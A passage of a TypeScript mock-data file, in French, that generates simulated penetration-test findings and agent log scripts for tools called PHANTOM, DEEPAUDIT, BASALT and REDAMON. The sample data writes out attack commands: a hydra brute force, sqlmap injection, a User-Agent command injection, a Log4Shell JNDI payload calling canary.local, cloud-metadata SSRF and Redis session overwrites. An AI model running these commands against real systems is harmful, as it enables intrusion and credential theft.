        "et des tokens), lu la configuration et démontré la possibilité d'écraser des clés applicatives — " +
        "takeover de session et empoisonnement de cache possibles.",
      evidence:
        "redis-cli -h <TARGET> INFO server → redis_version:5.0.7 (linux, port 6379)\n" +
        "redis-cli -h <TARGET> CONFIG GET requirepass → \"\" (aucune authentification)\n" +
        "KEYS * → 14 clés sensibles (session:*, token:*, cache:profile)\n" +
        "GET session:3f2a… → cookie de session complet lu",
      poc:
        "redis-cli -h <TARGET> KEYS '*' | head\n" +
        "redis-cli -h <TARGET> SET session:3f2a \"…\"   # écrasement possible",
      remediation:
        "bind 127.0.0.1 (ou interface interne uniquement) ; requirepass fort ou ACL Redis 6+ ; protected-mode yes ; " +
        "réseau interne avec pare-feu — jamais d'exposition publique du 6379.",
      sentinel: false,
    },
    {
      key: "r2",
      title: "Risque de prise de contrôle de sous-domaine (staging)",
      severity: "HIGH",
      confidence: "PROBABLE",
      category: "takeover",
      cvss: 8.2,
      location: "staging.<TARGET> → CNAME <app>.azurewebsites.net (404)",
      description:
        "Le sous-domaine de staging pointe vers un service cloud non réclamé (404 avec fingerprint typique). " +
        "Quiconque réserve le service récupère le trafic du sous-domaine, cookies de scope wildcard inclus.",
      evidence:
        "dig staging.<TARGET> CNAME +short → <app>.azurewebsites.net\n" +
        "curl -si https://staging.<TARGET>/ → 404 Not Found (404 Web Site not found — azurewebsites)\n" +
        "httpx : fingerprint de service non réclamé (dangling CNAME)\n" +
        "aucun challenge de propriété (TXT/CAA) détecté sur la zone",
      poc:
        "dig staging.<TARGET> CNAME +short && curl -si https://staging.<TARGET>/ | head -3",
      remediation:
        "Supprimer l'enregistrement DNS orphelin ou revendiquer immédiatement le service ; inventaire DNS " +
        "automatisé avec alertes sur les CNAME pendants ; challenges de propriété sur la zone.",
      sentinel: false,
    },
    {
      key: "r3",
      title: "Bind LDAP anonyme activé",
      severity: "HIGH",
      confidence: "CONFIRMED",
      category: "misconfig",
      cvss: 7.5,
      location: "389/tcp (OpenLDAP 2.4.47)",
      description:
        "L'annuaire LDAP accepte les requêtes anonymes : 143 entrées consultables, dont les mails internes, la " +
        "structure organisationnelle et des attributs techniques utiles à la préparation d'attaques (phishing " +
        "ciblé, énumération de comptes).",
      evidence:
        "ldapsearch -x -b \"dc=corp\" -H ldap://<TARGET> → 143 entrées (recherche anonyme acceptée)\n" +
        "  dn: uid=j.dupont,ou=people,dc=corp | mail: j.dupont@corp.internal | dept: finance\n" +
        "  dn: uid=svc-backup,ou=services,dc=corp | description: compte technique\n" +
        "ACL : aucune restriction sur le bind anonyme",
      poc:
        "ldapsearch -x -H ldap://<TARGET> -b \"dc=corp\" \"(objectClass=inetOrgPerson)\" cn mail | head -20",
      remediation:
        "Désactiver le bind anonyme (disallow bind_anon) ; ACLs granulaires par branche/attribut ; séparer les " +
        "données sensibles ; authentification obligatoire + chiffrement LDAPS.",
      sentinel: false,
    },
    {
      key: "r4",
      title: "Service SSH obsolète avec algorithms faibles",
      severity: "MEDIUM",
      confidence: "PROBABLE",
      category: "service",
      cve: "CVE-2023-38408",
      cvss: 5.0,
      location: "22/tcp (OpenSSH 7.2p2)",
      description:
        "Le service SSH expose un agent forwarding vulnérable (CVE-2023-38408) et accepte des algorithmes " +
        "obsolètes (ssh-rsa/SHA-1). Un attaquant positionné sur le réseau peut dégrader les échanges et exploiter " +
        "les faiblesses connues de cette version.",
      evidence:
        "banner : SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10\n" +
        "ssh-audit : ssh-rsa (SHA-1) offert — obsolète ; diffie-hellman-group1-sha1 détecté\n" +
        "CVE-2023-38408 : agent forwarding vulnérable (version < 9.3p2 confirmée)\n" +
        "aucun rate limit sur les tentatives de connexion",
      poc:
        "nc <TARGET> 22\n" +
        "ssh-audit <TARGET> | grep -E 'ssh-rsa|SHA-1|7.2'",
      remediation:
        "Upgrade OpenSSH >= 9.x ; désactiver ssh-rsa/SHA-1 et les KEX faibles ; fail2ban ; désactiver l'agent " +
        "forwarding si non nécessaire ; clés Ed25519.",
      sentinel: false,
    },
    {
      key: "r5",
      title: "Endpoint de métriques Prometheus exposé publiquement",
      severity: "MEDIUM",
      confidence: "PROBABLE",
      category: "info-disclosure",
      cvss: 5.3,
      location: "GET /metrics (9090→80 reverse proxy)",
      description:
        "Le reverse proxy expose les métriques Prometheus internes : noms de jobs, labels d'infrastructure, " +
        "latences et taux d'erreurs donnent une cartographie complète des services et facilitent le ciblage.",
      evidence:
        "curl https://<TARGET>/metrics → 200\n" +
        "# HELP go_goroutines Number of goroutines that currently exist.\n" +
        "go_goroutines 142\n" +
        "jobs visibles : api-gateway, worker-payments, db-replica-1 (labels instance/zone)\n" +
        "taux d'erreur 5xx par route exposé (http_request_duration_seconds_*)",
      poc:
        "curl -s https://<TARGET>/metrics | head -20",
      remediation:
        "Authentifier /metrics (basic auth, mTLS) ou le restreindre au réseau de monitoring ; retirer l'entrée du " +
        "reverse proxy public ; filtrer les labels sensibles ; NetworkPolicy côté cluster.",
      sentinel: false,
    },
    {
      key: "r6",
      title: "Console admin exposée sans verrouillage de compte",
      severity: "MEDIUM",
      confidence: "PROBABLE",
      category: "auth",
      cvss: 6.1,
      location: "POST /admin/login",
      description:
        "La console d'administration, accessible depuis Internet, n'applique aucun verrouillage : 300 tentatives " +
        "de mots de passe sans blocage ni CAPTCHA. Le brute force des comptes privilégiés est réalisable en " +
        "quelques heures avec une wordlist standard.",
      evidence:
        "300 requêtes POST /admin/login en 8 min — 0 blocage, 0 CAPTCHA, 0 alerte\n" +
        "réponses différenciantes (utilisateur existant/inexistant) : énumération possible\n" +
        "hydra : module https-post-form identifié, attaque réalisable à ~6 req/s",
      poc:
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n" +
        "  <TARGET> https-post-form \"/admin/login:username=^USER^&password=^PASS^:F=invalid\"",
      remediation:
        "Verrouillage progressif + CAPTCHA après N échecs ; MFA sur les comptes admin ; restriction IP / VPN " +
        "d'administration ; messages d'erreur génériques.",
      sentinel: false,
    },
    {
      key: "r7",
      title: "Listage de répertoires activé sur /uploads",
      severity: "LOW",
      confidence: "CONFIRMED",
      category: "misconfig",
      cvss: 3.9,
      location: "GET /uploads/",
      description:
        "L'autoindex est activé sur le répertoire de stockage : 37 fichiers listés, dont des sauvegardes de base " +
        "de données et des documents nominatifs téléchargeables directement sans authentification.",
      evidence:
        "GET /uploads/ → 200 (Index of /uploads)\n" +
        "37 fichiers listés : backup_2024-06.sql.gz (412 MB), contrat_acme.pdf, CV_*.pdf\n" +
        "GET /uploads/backup_2024-06.sql.gz → 200 (téléchargement sans authentification)\n" +
        "nginx : autoindex on confirmé dans la configuration serveur",
      poc:
        "curl -s https://<TARGET>/uploads/ | grep -o 'href=\"[^\"]*\"' | head",
      remediation:
        "autoindex off ; deny all par défaut avec fichiers servis par identifiants indirects ; authentification " +
        "sur les artefacts sensibles ; purge des backups du stockage web.",
      sentinel: false,
    },
    {
      key: "r8",
      title: "Injection d'en-tête Host / empoisonnement de cache",
      severity: "LOW",
      confidence: "PROBABLE",
      category: "web",
      cvss: 4.7,
      location: "GET / (Host: evil.local)",
      description:
        "L'application construit des URLs absolues à partir de l'en-tête Host sans validation, et le cache CDN " +
        "stocke la réponse contenant l'hôte attaquant : les visiteurs suivants peuvent être redirigés vers un " +
        "domaine contrôlé par l'attaquant.",
      evidence:
        "curl -s -H \"Host: evil.local\" https://<TARGET>/ → 200\n" +
        "réponse contient : <link href=\"https://evil.local/assets/app.css\">\n" +
        "X-Cache: HIT au second appel (sans l'en-tête) — ressource empoisonnée servie\n" +
        "aucune liste d'hôtes autorisés (vhost catch-all)",
      poc:
        "curl -s -H \"Host: evil.local\" https://<TARGET>/ | grep evil.local",
      remediation:
        "Valider l'en-tête Host contre une liste d'hôtes autorisés ; Host canonique fixé côté serveur ; bypass du " +
        "cache sur les réponses reflétant l'hôte ; vhosts explicites.",
      sentinel: false,
    },
  ],
};

// ─── Génération des scripts de logs ───────────────────────────────────

export interface ScriptCtx {
  target: string;
  targetType: TargetType;
  profile: Profile;
  totalMs: number;
  rng: () => number;
}

export interface ScriptLine {
  atMs: number;
  level: LogLevel;
  source: string;
  message: string;
}

type RawLine = { level: LogLevel; source: string; message: string };

export interface PhaseBound {
  name: string;
  startMs: number;
  endMs: number;
}

/** Bornes temporelles des phases d'un outil pour une durée totale donnée. */
export function phaseBounds(tool: Tool, totalMs: number): PhaseBound[] {
  const phases = PHASES[tool];
  const sum = phases.reduce((acc, p) => acc + p.frac, 0);
  let acc = 0;
  return phases.map((p) => {
    const startMs = Math.round((acc / sum) * totalMs);
    acc += p.frac;
    return { name: p.name, startMs, endMs: Math.round((acc / sum) * totalMs) };
  });
}

/** Hôte de la cible (sans schéma ni chemin) — pour amass, sous-domaines, etc. */
function hostOf(target: string): string {
  return target.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim() || target;
}

/** Répartit des lignes brutes sur un segment de temps. */
function spread(raw: RawLine[], startMs: number, endMs: number, rng: () => number): ScriptLine[] {
  const n = raw.length;
  if (n === 0) return [];
  const start = Math.max(startMs, 3);
  const end = Math.max(endMs - 15, start + n + 1);
  return raw.map((r, i) => ({
    atMs: Math.round(start + ((i + 0.15 + rng() * 0.7) / n) * (end - start)),
    ...r,
  }));
}

/**
 * Assemble un script complet : en-tête système, transitions de phase,
 * contenu par phase (réparti sur les bornes), bruit aléatoire, puis tri
 * avec atMs strictement croissant. Le tout borné à ~97 % de totalMs.
 */
function assemble(tool: Tool, ctx: ScriptCtx, segs: RawLine[][]): ScriptLine[] {
  const scriptMs = Math.round(ctx.totalMs * 0.97);
  const bounds = phaseBounds(tool, scriptMs);
  const shortId = Math.floor(ctx.rng() * 0xffffff).toString(16).padStart(6, "0");
  const lines: ScriptLine[] = [];

  // En-tête système
  lines.push({
    atMs: 0,
    level: "INFO",
    source: "system",
    message: `Conteneur éphémère démarré pour ${tool} — cible ${ctx.target} (profil ${ctx.profile})`,
  });
  lines.push({
    atMs: 1,
    level: "INFO",
    source: "system",
    message: `Isolation : réseau ${
      tool === "BASALT" ? "coupé (sandbox sans réseau)" : "restreint (egress filtré)"
    } — sandbox ${tool}-sandbox-${shortId}`,
  });

  // Transitions de phase
  bounds.forEach((b, i) => {
    lines.push({
      atMs: i === 0 ? 2 : b.startMs,
      level: "INFO",
      source: "system",
      message: `── ${b.name} ──`,
    });
  });

  // Contenu par phase
  segs.forEach((raw, i) => {
    if (i < bounds.length && raw.length > 0) {
      lines.push(...spread(raw, bounds[i].startMs, bounds[i].endMs, ctx.rng));
    }
  });

  // Bruit aléatoire (6 à 12 lignes) réparti sur la durée active
  const pool = NOISE_POOLS[tool];
  const noiseCount = 6 + Math.floor(ctx.rng() * 7);
  for (let i = 0; i < noiseCount; i++) {
    const fn = pool[Math.floor(ctx.rng() * pool.length)];
    const raw = fn(ctx.target);
    lines.push({ atMs: Math.round((0.04 + ctx.rng() * 0.92) * scriptMs), ...raw });
  }

  // Tri + atMs strictement croissant
  lines.sort((a, b) => a.atMs - b.atMs);
  const out: ScriptLine[] = [];
  let last = -1;
  for (const l of lines) {
    const at = l.atMs <= last ? last + 1 : l.atMs;
    out.push({ ...l, atMs: at });
    last = at;
  }
  return out;
}

// ─── Lignes de bruit par outil ────────────────────────────────────────

const NOISE_POOLS: Record<Tool, ((target: string) => RawLine)[]> = {
  PHANTOM: [
    () => ({ level: "INFO", source: "cache", message: "cache miss : template nuclei cves/2023 — recompilation locale" }),
    () => ({ level: "WARN", source: "net", message: "429 sur /api — backoff 2s" }),
    (t) => ({ level: "WARN", source: "net", message: `timeout httpx (3s) sur ${t} — retry 1/2` }),
    (t) => ({ level: "INFO", source: "dns", message: `résolution lente de ${t} (812ms) — cache local renseigné` }),
    () => ({ level: "INFO", source: "phantom", message: "rotation d'identité : user-agent et empreinte TLS réinitialisés" }),
    () => ({ level: "WARN", source: "phantom", message: "réponse 503 transitoire — nouvelle tentative planifiée" }),
    () => ({ level: "INFO", source: "system", message: "gc mémoire : 212 MB libérés" }),
    () => ({ level: "INFO", source: "phantom", message: "checkpoint d'état sauvegardé (reprise possible)" }),
    () => ({ level: "WARN", source: "net", message: "débit réduit à 20 req/s (politesse, respect du périmètre)" }),
    () => ({ level: "INFO", source: "net", message: "TLS handshake moyen : 240ms" }),
  ],
  DEEPAUDIT: [
    () => ({ level: "INFO", source: "cache", message: "cache AST vide — re-parse des 12 fichiers prioritaires" }),
    () => ({ level: "WARN", source: "agent:analyse", message: "motif répété dans settings.py — dédoublonnage appliqué" }),
    () => ({ level: "INFO", source: "system", message: "compaction de l'index sémantique (embeddings)" }),
    () => ({ level: "WARN", source: "agent:recon", message: "fichiers binaires ignorés (assets/fonts/*.woff2)" }),
    () => ({ level: "INFO", source: "agent:vérification", message: "file d'attente des PoC réordonnée par criticité" }),
    () => ({ level: "WARN", source: "system", message: "OOM évité de justesse — heap 480/512 MB" }),
    () => ({ level: "INFO", source: "git", message: "218 objets récupérés — graphe de commits reconstruit" }),
    () => ({ level: "INFO", source: "system", message: "checkpoint agents : état persisté (12 MB)" }),
  ],
  BASALT: [
    () => ({ level: "WARN", source: "sandbox", message: "OOM killer armé — heap surveillé" }),
    () => ({ level: "INFO", source: "poc", message: "compilation déterministe vérifiée (2 runs, hash identique)" }),
    () => ({ level: "WARN", source: "sandbox", message: "entrée /dev/urandom bruitée — jitter mesuré 0.3ms" }),
    () => ({ level: "INFO", source: "basalt", message: "hash des sentinelles vérifié avant/après exécution" }),
    () => ({ level: "WARN", source: "poc", message: "PoC ignoré : dépendance réseau (sandbox sans réseau)" }),
    () => ({ level: "INFO", source: "sandbox", message: "cache de build local : 214 MB réutilisés" }),
    () => ({ level: "INFO", source: "poc", message: "timeout strict appliqué : 5s max par PoC" }),
    () => ({ level: "WARN", source: "sandbox", message: "processus zombie nettoyé (pid 118)" }),
  ],
  REDAMON: [
    (t) => ({ level: "WARN", source: "dns", message: `résolution NXDOMAIN — wildcard suspecté sur ${t}` }),
    () => ({ level: "INFO", source: "nmap", message: "retransmission TCP sur 6379/tcp — réessai effectué" }),
    () => ({ level: "WARN", source: "net", message: "rate limit du pare-feu détecté — débit réduit à 30 pps" }),
    () => ({ level: "INFO", source: "redamon", message: "wordlist shuffle : ordre randomisé (anti-détection)" }),
    (t) => ({ level: "WARN", source: "httpx", message: `timeout 2s sur vpn.${hostOf(t)} — exclu du reste du run` }),
    () => ({ level: "INFO", source: "system", message: "cache de bannières enrichi (4 nouveaux services)" }),
    () => ({ level: "WARN", source: "redamon", message: "banner grabbing échoué sur 9090 — fingerprint passif" }),
    () => ({ level: "INFO", source: "dns", message: "résolveur réécrit : 1.1.1.1 → resolver local (fiabilité)" }),
  ],
};

// ─── Builders par outil ───────────────────────────────────────────────

function buildPhantomScript(ctx: ScriptCtx): ScriptLine[] {
  const t = ctx.target;
  const segs: RawLine[][] = [
    // INIT
    [
      { level: "INFO", source: "phantom", message: "cycle ReAct initialisé — budget d'actions : 64, mémoire persistée" },
      { level: "CMD", source: "phantom", message: `$ export AF_TARGET=${t} && phantom-agent start --profile ${ctx.profile}` },
      { level: "INFO", source: "phantom", message: "objectif : cartographier la surface d'attaque puis escalader les vecteurs identifiés" },
      { level: "TOOL", source: "phantom", message: "tool_call: httpx (12ms, disponibilité confirmée)" },
    ],
    // RECON
    [
      { level: "CMD", source: "phantom", message: `$ nmap -sV -Pn --top-ports 200 ${t}` },
      { level: "INFO", source: "nmap", message: "3 ports ouverts : 80/tcp (http), 443/tcp (https), 8080/tcp (http-proxy)" },
      { level: "CMD", source: "phantom", message: `$ httpx -u ${t} -title -tech-detect -status-code` },
      { level: "INFO", source: "httpx", message: `${t} [200] [Bienvenue — Portail] [nginx 1.18.0, PHP 7.4]` },
      { level: "AGENT", source: "phantom-reasoning", message: "réflexion: la cible expose un cookie de session sans flag Secure — interception possible en http" },
      { level: "AGENT", source: "phantom-reasoning", message: "réflexion: le header X-Powered-By révèle la stack exacte, utile pour la sélection des exploits" },
      { level: "CMD", source: "phantom", message: `$ whatweb -a 3 ${t}` },
      { level: "INFO", source: "whatweb", message: "robots.txt présent — 4 chemins privés révélés (/admin, /api, /backup, /staging)" },
      { level: "INFO", source: "nuclei", message: "[cves/2023/CVE-2023-XXXXX] [http] [high] https://" + t + "/actuator/env" },
      { level: "TOOL", source: "phantom", message: "tool_call: nmap (9ms, 3 résultats)" },
    ],
    // ENUMERATION
    [
      { level: "CMD", source: "phantom", message: `$ ffuf -u ${t}/FUZZ -w /usr/share/wordlists/web-content.txt -mc 200,301,302 -t 40` },
      { level: "INFO", source: "ffuf", message: "/admin [301] — redirection vers /admin/login" },
      { level: "INFO", source: "ffuf", message: "/.git/HEAD [200] — dépôt source potentiellement exposé" },
      { level: "INFO", source: "ffuf", message: "/api/invoices/1042 [200] — identifiants séquentiels détectés" },
      { level: "CMD", source: "phantom", message: `$ katana -u ${t} -d 3 -jc -o crawl.json` },
      { level: "INFO", source: "katana", message: "84 URLs collectées, 12 paramètres candidats (q, url, id, name)" },
      { level: "AGENT", source: "phantom-reasoning", message: "réflexion: un endpoint /api/fetch proxifie des URLs distantes — vecteur SSRF probable" },
      { level: "AGENT", source: "phantom-reasoning", message: "réflexion: le paramètre q de /search est réfléchi sans encodage — XSS réflexif à confirmer" },
      { level: "TOOL", source: "phantom", message: "tool_call: ffuf (214ms, 7 résultats)" },
      { level: "CMD", source: "phantom", message: `$ arjun -u ${t}/api/fetch -m GET` },
      { level: "INFO", source: "arjun", message: "paramètre caché découvert : debug=1 (réponse différente)" },
      { level: "TOOL", source: "phantom", message: "tool_call: katana (31ms, 84 URLs)" },
    ],
    // EXPLOITATION
    [
      { level: "AGENT", source: "phantom-reasoning", message: "réflexion: tentative d'injection SQL sur POST /login — le délai de réponse varie avec un payload time-based" },
      { level: "CMD", source: "phantom", message: `$ sqlmap -u ${t}/login --data="email=a&password=b" -p email --batch --time-sec=2` },
      { level: "INFO", source: "sqlmap", message: "parameter 'email' is vulnerable" },
      { level: "INFO", source: "sqlmap", message: "back-end DBMS: SQLite" },
      { level: "AGENT", source: "phantom-reasoning", message: "réflexion: dump de la table users — 14 hachages bcrypt récupérés, 3 réutilisés sur la console admin" },
      { level: "CMD", source: "phantom", message: `$ curl -s ${t}/admin/export -H "User-Agent: \\\`;id;#"` },
      { level: "INFO", source: "phantom", message: "sortie de commande détectée dans le CSV exporté (uid=33(root)) — RCE confirmé" },
      { level: "TOOL", source: "phantom", message: "tool_call: sqlmap (4.2s, 14 lignes extraites)" },
      { level: "AGENT", source: "phantom-reasoning", message: "réflexion: SSRF — POST /api/fetch vers 169.254.169.254 renvoie les métadonnées IAM" },
      { level: "INFO", source: "phantom", message: "métadonnées cloud lues : ami-0abc…, rôle iam app-role" },
      { level: "TOOL", source: "phantom", message: "tool_call: nuclei (47ms, 3 templates matched)" },
      { level: "AGENT", source: "phantom-reasoning", message: "réflexion: consolidation des accès — 2 vecteurs RCE, 1 accès admin, 1 lecture de données tierces" },
    ],
    // POST-EXPLOITATION
    [
      { level: "CMD", source: "phantom", message: "$ whoami && id" },
      { level: "INFO", source: "phantom", message: "contexte d'exécution : uid=33(root) — conteneur applicatif non cloisonné" },
      { level: "CMD", source: "phantom", message: "$ sqlite3 /data/app.db \".tables\"" },
      { level: "INFO", source: "phantom", message: "tables sensibles : users, sessions, invoices, audit_log" },
      { level: "AGENT", source: "phantom-reasoning", message: "réflexion: pivot vers le réseau interne bloqué par l'egress filtré — pas de mouvement latéral" },
      { level: "INFO", source: "phantom", message: "artefacts de preuve collectés : 6 captures, 2 dumps partiels (hashés côté plateforme)" },
      { level: "WARN", source: "phantom", message: "action limitée : la destruction de données est interdite par la charte d'engagement" },
    ],
    // RAPPORT
    [
      { level: "INFO", source: "phantom", message: "scoring CVSS des vecteurs confirmés" },
      { level: "INFO", source: "phantom", message: "attribution de confiance : CONFIRMED (exécution), PROBABLE (analyse passive)" },
      { level: "INFO", source: "phantom", message: `rédaction des preuves reproductibles — ${effectiveFindingCount("PHANTOM", ctx.profile)} constats documentés` },
      { level: "INFO", source: "system", message: "compression des artefacts du scan (12.4 MB)" },
      { level: "INFO", source: "phantom", message: "rapport d'agent transmis à la plateforme" },
    ],
  ];
  return assemble("PHANTOM", ctx, segs);
}

function buildDeepauditScript(ctx: ScriptCtx): ScriptLine[] {
  const t = ctx.target;
  const scope = ctx.targetType === "GIT" ? "du dépôt source" : "de l'application web";
  const segs: RawLine[][] = [
    // INIT
    [
      { level: "CMD", source: "deepaudit", message: `$ deepaudit orchestrate --target ${t} --profile ${ctx.profile}` },
      { level: "INFO", source: "orchestrator", message: "plan d'audit généré — 3 agents (recon, analyse, vérification)" },
      { level: "INFO", source: "orchestrator", message: `contexte : ${scope} — périmètre validé` },
      { level: "INFO", source: "system", message: "images agents prêtes : deepaudit-recon:latest, deepaudit-analyse:latest" },
    ],
    // AGENT RECON
    [
      { level: "AGENT", source: "agent:recon", message: `cartographie ${scope} : indexation des fichiers et endpoints` },
      { level: "CMD", source: "agent:recon", message: "$ git log --stat -n 50 --pretty=format:'%h %ad %s'" },
      { level: "INFO", source: "agent:recon", message: "2 418 fichiers indexés — 12 répertoires prioritaires" },
      { level: "CMD", source: "agent:recon", message: "$ semgrep --config auto --json -o /tmp/sg.json" },
      { level: "INFO", source: "agent:recon", message: "semgrep: 23 alertes (4 erreurs, 9 warnings, 10 infos)" },
      { level: "AGENT", source: "agent:recon", message: "frontières d'entrée identifiées : /api/session/restore, /files/report, /api/me" },
      { level: "CMD", source: "agent:recon", message: "$ git log --diff-filter=A --name-only -- '*.env*'" },
      { level: "WARN", source: "agent:recon", message: "fichiers .env historisés détectés (2) — pistes secrets" },
      { level: "INFO", source: "agent:recon", message: "handoff → agent:analyse (12 fichiers prioritaires, 23 alertes)" },
    ],
    // AGENT ANALYSE
    [
      { level: "AGENT", source: "agent:analyse", message: "backend/config/settings.py:42 — clé AWS codée en dur (pattern AKIA…)" },
      { level: "AGENT", source: "agent:analyse", message: "backend/api/cache.py:118 — pickle.loads(base64.b64decode(user_token)) sur entrée utilisateur" },
      { level: "AGENT", source: "agent:analyse", message: "backend/routes/files.py:57 — chemin non normalisé (join sans Clean)" },
      { level: "AGENT", source: "agent:analyse", message: "frontend/src/utils/deepMerge.js:12 — clés __proto__ non filtrées" },
      { level: "AGENT", source: "agent:analyse", message: "backend/auth/jwt.py:31 — jwt.decode sans algorithme épinglé, verify_signature=False" },
      { level: "CMD", source: "agent:analyse", message: "$ git log --follow -p backend/auth/jwt.py | head -80" },
      { level: "INFO", source: "agent:analyse", message: "introduction de la vulnérabilité JWT au commit f31c9d2 (il y a 5 mois)" },
      { level: "AGENT", source: "agent:analyse", message: "hypothèse H-1 : alg=none accepté sur /api/me — à vérifier en sandbox" },
      { level: "AGENT", source: "agent:analyse", message: "hypothèse H-2 : path traversal sur /files/report — à vérifier en sandbox" },
      { level: "AGENT", source: "agent:analyse", message: "services/api/pom.xml : log4j-core 2.14.1 — candidate CVE-2021-44228 (Log4Shell)" },
      { level: "CMD", source: "agent:analyse", message: "$ dependency-check --scan services/api --format JSON" },
      { level: "INFO", source: "agent:analyse", message: "4 dépendances critiques candidates → handoff agent:vérification" },
    ],
    // AGENT VÉRIFICATION (sandbox PoC)
    [
      { level: "CMD", source: "deepaudit", message: "$ docker run --network none deepaudit-verify:latest --plan H-1,H-2,H-3,H-4" },
      { level: "AGENT", source: "agent:vérification", message: "H-1 (pickle) : PoC construit, exécution en sandbox → écriture /tmp/pwned confirmée" },
      { level: "SUCCESS", source: "agent:vérification", message: "BASALT-POC-TRIGGERED — sentinelle fichier activée (PoC désérialisation)" },
      { level: "AGENT", source: "agent:vérification", message: "H-2 (path traversal) : lecture /etc/passwd simulée → contenu capturé, confirmé" },
      { level: "AGENT", source: "agent:vérification", message: "H-3 (JWT alg=none) : token forgé accepté (401→200 sur /api/me) — confirmé" },
      { level: "AGENT", source: "agent:vérification", message: "H-4 (Log4Shell) : payload ${jndi:ldap://canary.local/a} injecté — pas de résolution DNS (sandbox) → PROBABLE" },
      { level: "INFO", source: "agent:vérification", message: "100 requêtes /login simulées → aucun blocage (hypothèse rate-limit vérifiée)" },
      { level: "WARN", source: "agent:vérification", message: "vérification SSRF impossible sans réseau — statut UNVERIFIED conservé" },
      { level: "TOOL", source: "deepaudit", message: "tool_call: verify-sandbox (3.1s, 4 PoC exécutés)" },
      { level: "AGENT", source: "agent:vérification", message: "matrice de confiance recalculée : ~70% CONFIRMED, ~30% PROBABLE" },
      { level: "AGENT", source: "agent:vérification", message: "contrôle anti-faux-positif : preuves horodatées et hashées (sha256)" },
      { level: "INFO", source: "agent:vérification", message: `handoff → rapporteur (${effectiveFindingCount("DEEPAUDIT", ctx.profile)} constats notés)` },
    ],
    // RAPPORT
    [
      { level: "INFO", source: "orchestrator", message: "consolidation multi-agents — dédoublonnage des constats" },
      { level: "INFO", source: "orchestrator", message: "tri par sévérité appliqué (CRITICAL d'abord)" },
      { level: "INFO", source: "orchestrator", message: "remédiations attachées avec références de code exactes" },
      { level: "INFO", source: "system", message: "diff pré-patch suggéré pour 4 constats (safe-fix)" },
      { level: "INFO", source: "orchestrator", message: "confiance finale : CONFIRMED x4, PROBABLE x3" },
      { level: "INFO", source: "orchestrator", message: "rapport d'audit transmis à la plateforme" },
    ],
  ];
  return assemble("DEEPAUDIT", ctx, segs);
}

function buildBasaltScript(ctx: ScriptCtx): ScriptLine[] {
  const t = ctx.target;
  const segs: RawLine[][] = [
    // INIT
    [
      { level: "CMD", source: "basalt", message: `$ basalt-scan --target ${t} --profile ${ctx.profile} --offline-sandbox` },
      { level: "INFO", source: "basalt", message: "mode : vérification par exécution — aucun test passif, uniquement des PoC sandboxés" },
      { level: "INFO", source: "system", message: "quota sandbox : 1 vCPU, 512 MB, disque 256 MB, durée max 600s" },
      { level: "INFO", source: "basalt", message: "plan : charger les règles, compiler les PoC candidats, exécuter, lire les sentinelles" },
    ],
    // CHARGEMENT RÈGLES
    [
      { level: "INFO", source: "basalt", message: "chargement des règles : 1 432 templates de PoC (index local)" },
      { level: "INFO", source: "basalt", message: "sélection : 218 règles applicables au fingerprint de la cible" },
      { level: "WARN", source: "basalt", message: "cache miss sur 14 règles — recompilation nécessaire" },
      { level: "INFO", source: "basalt", message: "dédoublonnage des vecteurs : 189 PoC uniques retenus" },
      { level: "INFO", source: "basalt", message: "priorisation : CRITICAL d'abord (injection, désérialisation, path)" },
      { level: "TOOL", source: "basalt", message: "tool_call: rule-index (18ms, 218 règles)" },
    ],
    // BUILD SANDBOX (réseau coupé)
    [
      { level: "CMD", source: "basalt", message: "$ basalt sandbox build --image basalt-runner:alpine --network none" },
      { level: "INFO", source: "sandbox", message: "image basalt-runner:alpine (réseau: none) — pull local, 34 MB" },
      { level: "INFO", source: "sandbox", message: "montages : /work (ro), /tmp/sentinel (rw), /proc isolée" },
      { level: "INFO", source: "sandbox", message: "sentinelles armées : fichier /tmp/sentinel, horloge event-loop, canary réseau" },
      { level: "INFO", source: "sandbox", message: "limites : seccomp default, pas de CAP_NET_RAW, ulimit -t 60" },
      { level: "INFO", source: "sandbox", message: "checklist anti-fuite : DNS désactivé, seuls les sockets UNIX sont autorisés" },
      { level: "SUCCESS", source: "sandbox", message: "sandbox prête — réseau vérifié coupé (aucune route)" },
      { level: "TOOL", source: "basalt", message: "tool_call: sandbox-build (940ms, image alpine)" },
    ],
    // EXÉCUTION POC
    [
      { level: "INFO", source: "poc", message: "lot 1 : 42 PoC d'injection SQL — compilation…" },
      { level: "INFO", source: "poc", message: "compilation sqlite3 embarquée : OK (37/42)" },
      { level: "INFO", source: "poc", message: "exécution : requêtes générées depuis app/db/users.dao:88" },
      { level: "SUCCESS", source: "basalt-sentinel", message: "BASALT-POC-TRIGGERED — sentinelle fichier /tmp/sentinel activée (lot injection SQL)" },
      { level: "INFO", source: "poc", message: "lot 2 : 51 PoC de désérialisation (pickle/Marshal)" },
      { level: "INFO", source: "poc", message: "exécution : gadget déclenché, écriture de fichier sentinelle observée" },
      { level: "INFO", source: "poc", message: "lot 3 : 38 PoC de path traversal" },
      { level: "INFO", source: "poc", message: "exécution : ../../../../../etc/passwd → 6 lignes capturées" },
      { level: "INFO", source: "poc", message: "lot 4 : 29 PoC de ReDoS — mesure de l'event-loop" },
      { level: "WARN", source: "poc", message: "blocage event-loop 12.0s (> seuil 2s) — sentinelle horloge déclenchée" },
      { level: "WARN", source: "poc", message: "SSRF : canaire non reçu — sandbox sans réseau, non vérifiable" },
      { level: "INFO", source: "poc", message: "43/189 PoC déclenchés, 142 sans effet, 4 non vérifiables" },
      { level: "INFO", source: "poc", message: "hash des sentinelles consignés comme preuves d'exécution" },
      { level: "TOOL", source: "basalt", message: "tool_call: poc-runner (exécution complète en sandbox)" },
    ],
    // RAPPORT
    [
      { level: "INFO", source: "basalt", message: "tri des résultats : preuve d'exécution > trace > inférence" },
      { level: "INFO", source: "basalt", message: `${effectiveFindingCount("BASALT", ctx.profile)} constats attachés à leur PoC exécutable` },
      { level: "INFO", source: "basalt", message: "1 constat non vérifiable conservé (sandbox sans réseau) — statut UNVERIFIED" },
      { level: "INFO", source: "basalt", message: "empaquetage des preuves : traces de sandbox + hash des sentinelles" },
      { level: "INFO", source: "system", message: "purge de la sandbox : conteneur détruit, /tmp/sentinel effacé" },
      { level: "INFO", source: "basalt", message: "rapport d'exécution transmis à la plateforme" },
    ],
  ];
  return assemble("BASALT", ctx, segs);
}

function buildRedamonScript(ctx: ScriptCtx): ScriptLine[] {
  const t = ctx.target;
  const host = hostOf(t);
  const segs: RawLine[][] = [
    // INIT
    [
